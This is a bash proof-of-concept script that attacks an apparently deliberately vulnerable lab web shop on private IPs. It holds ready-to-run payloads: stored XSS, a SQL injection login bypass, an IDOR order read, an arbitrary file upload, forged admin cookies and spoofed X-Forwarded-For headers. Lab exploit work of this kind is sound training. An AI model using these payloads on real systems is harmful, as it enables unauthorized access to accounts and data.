#!/bin/bash
# PoC commands for VULN SHOP (SEC v1)
set -euo pipefail

TARGET="${TARGET:-http://192.168.0.28:3000}"
MY_IP="${MY_IP:-10.0.0.102}"
HDR=(-H "X-Forwarded-For: ${MY_IP}")

echo "[*] Stored XSS in /board"
curl -i "${HDR[@]}" -X POST -d 'content=<script>alert(1337)</script>' "$TARGET/board"

echo "[*] Auth bypass via SQLi on /login"
curl -i -c /tmp/vulnshop.cookies "${HDR[@]}" -X POST \
  --data-urlencode "username=admin' OR '1'='1" \
  --data-urlencode "password=pw" \
  "$TARGET/login"

echo "[*] IDOR on /order?id=2 (requires cookies from previous step)"
curl -i -b /tmp/vulnshop.cookies "${HDR[@]}" "$TARGET/order?id=2"

echo "[*] Arbitrary file upload to /profile/upload (uses script/poc.txt)"
curl -i -b /tmp/vulnshop.cookies "${HDR[@]}" -F "profile_image=@script/poc.txt" \
  "$TARGET/profile/upload"

echo "[*] Cookie tampering auth bypass (no prior login needed)"
curl -i -b "user=admin; isAdmin=true; user_id=1" "${HDR[@]}" "$TARGET/profile"
curl -i -b "user=attacker; isAdmin=false; user_id=1" "${HDR[@]}" "$TARGET/order"
